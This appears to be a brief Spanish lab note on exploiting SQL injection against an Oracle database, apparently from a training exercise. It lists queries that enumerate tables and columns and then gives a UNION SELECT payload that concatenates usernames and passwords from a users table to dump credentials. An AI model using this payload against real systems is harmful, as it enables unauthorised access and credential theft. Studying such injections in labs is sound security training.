Oracle detected

![[Pasted image 20241223192056.png]]

Extraemos nombres de las tablas (en oracle solo hay una base de datos)

```SQL
SELECT owner, table_name FROM all_tables;
```

![[Pasted image 20241223193731.png]]

```SQL
SELECT column_name,column_name FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
```

![[Pasted image 20241223194104.png]]

Dumpeamos los datos con concatenaciones : 

```SQL
'+UNION+SELECT+USERNAME_UKFAPP||':'||PASSWORD_LHYWXK,''+FROM+USERS_HSTQSG+--+-
```

![[Pasted image 20241223194456.png]]